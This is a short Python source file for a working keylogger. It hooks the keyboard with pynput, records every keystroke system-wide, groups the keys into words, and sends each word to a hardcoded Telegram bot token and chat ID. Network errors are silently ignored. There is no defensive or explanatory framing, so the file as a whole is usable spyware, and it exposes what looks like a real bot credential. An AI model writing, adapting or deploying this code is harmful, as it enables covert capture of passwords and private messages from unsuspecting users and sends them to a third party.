
import threading
import time
from queue import Queue, Empty
from datetime import datetime, timedelta
import requests
from pynput import keyboard

BOT_TOKEN = "7756196800:AAE_2EBn1gp9ZZTUatjsVdPt68DLV3usEOU"
CHAT_ID = "7075072566"

def send_key(key: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {"chat_id": CHAT_ID, "text": key}
    try:
        requests.post(url, data=params)
    except Exception:
        pass

def key_to_str(key):
    if key in {keyboard.Key.shift, keyboard.Key.shift_r}:
        return None
    if key == keyboard.Key.caps_lock:
        return "{caps_lock}"
    if key == keyboard.Key.enter:
        return "{return}"
    if key == keyboard.Key.backspace:
        return "{backspace}"
    if key == keyboard.Key.tab:
        return "{tab}"
    if key == keyboard.Key.space:
        return " "
    if key == keyboard.Key.esc:
        return "{escape}"
    if isinstance(key, keyboard.KeyCode):
        return key.char
    return None

def worker(q: Queue):
    count = 0
    window_start = datetime.now()
    buffer = []
    while True:
        try:
            key = q.get(timeout=1)
        except Empty:
            continue
        if key in (" ", "{return}"):
            buffer.append(key)
            now = datetime.now()
            if now - window_start >= timedelta(seconds=1):
                window_start = now
                count = 0
            if count < 30:
                send_key("".join(buffer))
                count += 1
            else:
                time.sleep(0.05)
                window_start = datetime.now()
                count = 0
                send_key("".join(buffer))
                count += 1
            buffer.clear()
        elif key == "{backspace}":
            if buffer:
                buffer.pop()
        else:
            buffer.append(key)

def on_press(key):
    key_str = key_to_str(key)
    if key_str is not None:
        q.put(key_str)

q = Queue()
threading.Thread(target=worker, args=(q,), daemon=True).start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()